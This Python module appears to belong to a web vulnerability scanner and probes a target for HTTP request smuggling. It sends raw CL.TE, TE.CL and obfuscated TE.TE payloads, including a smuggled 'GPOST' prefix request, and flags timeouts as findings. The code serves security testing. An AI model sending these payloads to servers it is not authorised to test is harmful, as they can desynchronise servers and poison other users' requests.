import socket
import ssl
import time
from urllib.parse import urlparse

def create_socket(target_url):
    parsed = urlparse(target_url)
    host = parsed.netloc.split(':')[0]
    
    if ":" in parsed.netloc:
        port = int(parsed.netloc.split(':')[1])
    else:
        port = 443 if parsed.scheme == "https" else 80

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect((host, port))
        
        if parsed.scheme == "https":
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)
            
        return sock, host, port
    except Exception:
        return None, None, None

def send_raw_payload(sock, payload):
    try:
        sock.sendall(payload)
        sock.settimeout(5) 
        return sock.recv(4096)
    except socket.timeout:
        return "TIMEOUT"
    except Exception:
        return None

def run_smuggling_test(engine, point, param, level, bypass, waf_name=None):
    target_url = point['url']
    path = urlparse(target_url).path or "/"
    
    if engine.config['verbose']:
        print(f"[INFO] Test Smuggling (Raw Socket) sur {target_url}")

    if param != "Headers": 
        return

    sock, host, port = create_socket(target_url)
    if sock:
        payload_cl_te = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Connection: keep-alive\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "X"
        ).encode() 

        start = time.time()
        resp = send_raw_payload(sock, payload_cl_te)
        duration = time.time() - start
        sock.close()

        if resp == "TIMEOUT" or duration > 4.5:
            engine.add_vulnerability(
                "HTTP Smuggling (CL.TE)", 
                target_url, 
                "Raw Payload (CL=6, TE=chunked)", 
                "Le serveur a timeout en attendant la fin du chunk (Désynchronisation détectée).", 
                parameter="Headers"
            )
            return # On a trouvé, on arrête

    sock, host, port = create_socket(target_url)
    if sock:
        payload_te_cl = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "5c\r\n"       
            "GPOST / HTTP/1.1\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 15\r\n"
            "\r\n"
            "x=1\r\n"
            "0\r\n"
            "\r\n"
        ).encode()

        start = time.time()
        resp = send_raw_payload(sock, payload_te_cl)
        duration = time.time() - start
        sock.close()

        if resp == "TIMEOUT" or duration > 4.5:
            engine.add_vulnerability(
                "HTTP Smuggling (TE.CL)", 
                target_url, 
                "Raw Payload (CL=4, TE=chunked)", 
                "Le serveur a timeout (Queue Poisoning potentiel).", 
                parameter="Headers"
            )

    obfuscations = [
        "Transfer-Encoding: xchunked",
        "Transfer-Encoding : chunked",
        "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
        " Transfer-Encoding: chunked"
    ]

    for te_header in obfuscations:
        sock, host, port = create_socket(target_url)
        if not sock: continue
        
        payload_te_te = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            f"{te_header}\r\n"
            "\r\n"
            "5c\r\n"
            "GPOST / HTTP/1.1\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 15\r\n"
            "\r\n"
            "x=1\r\n"
            "0\r\n"
            "\r\n"
        ).encode()

        start = time.time()
        resp = send_raw_payload(sock, payload_te_te)
        duration = time.time() - start
        sock.close()

        if resp == "TIMEOUT" or duration > 4.5:
            engine.add_vulnerability(
                "HTTP Smuggling (TE.TE Obfuscation)", 
                target_url, 
                f"Header Obfusqué: {te_header}", 
                "Désynchronisation via header TE malformé.", 
                parameter="Headers"
            )
            break
